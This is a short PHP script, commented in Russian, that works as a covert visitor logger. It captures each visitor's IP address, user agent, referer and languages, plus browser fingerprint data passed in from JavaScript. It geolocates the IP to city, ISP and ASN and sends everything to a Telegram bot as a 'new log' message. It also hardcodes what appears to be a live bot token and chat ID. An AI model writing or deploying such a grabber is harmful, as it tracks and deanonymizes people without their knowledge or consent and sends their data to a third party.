<?php
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Нет';
$lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Неизвестно';
$date = date("Y-m-d H:i:s");

// Получение дополнительных данных из JS
$jsData = isset($_GET['data']) ? json_decode(base64_decode($_GET['data']), true) : null;
$screenSize = $jsData['screen'] ?? 'Неизвестно';
$timezone = $jsData['timezone'] ?? 'Неизвестно';
$platform = $jsData['platform'] ?? 'Неизвестно';
$cpuCores = $jsData['cpu'] ?? 'Неизвестно';
$ram = $jsData['ram'] ?? 'Неизвестно';
$browserLang = $jsData['lang'] ?? 'Неизвестно';

// Получение геолокации по IP
$geo = file_get_contents("http://ip-api.com/json/$ip?fields=status,country,regionName,city,isp,org,as,query");
$geoData = json_decode($geo, true);

$country = $geoData['status'] == 'fail' ? 'Неизвестно' : $geoData['country'];
$region = $geoData['status'] == 'fail' ? 'Неизвестно' : $geoData['regionName'];
$city = $geoData['status'] == 'fail' ? 'Неизвестно' : $geoData['city'];
$isp = $geoData['status'] == 'fail' ? 'Неизвестно' : $geoData['isp'];
$org = $geoData['status'] == 'fail' ? 'Неизвестно' : $geoData['org'];
$asn = $geoData['status'] == 'fail' ? 'Неизвестно' : $geoData['as'];

// Формирование сообщения
$message = "📡 Новый лог:
🕵️ IP: $ip
🌍 Страна: $country
🏙 Регион: $region
🏠 Город: $city
📡 Провайдер: $isp
🏢 Организация: $org
🔗 ASN: $asn
🌐 User-Agent: $userAgent
📜 Реферер: $referer
🈳 Язык HTTP: $lang
🈴 Язык браузера: $browserLang
💻 Платформа: $platform
🖥 Разрешение экрана: $screenSize
⏳ Часовой пояс: $timezone
⚡ CPU Ядер: $cpuCores
💾 ОЗУ: $ram
📅 Дата: $date";

// Отправка в Telegram
$token = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
$chat_id = "7477642275";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
?>
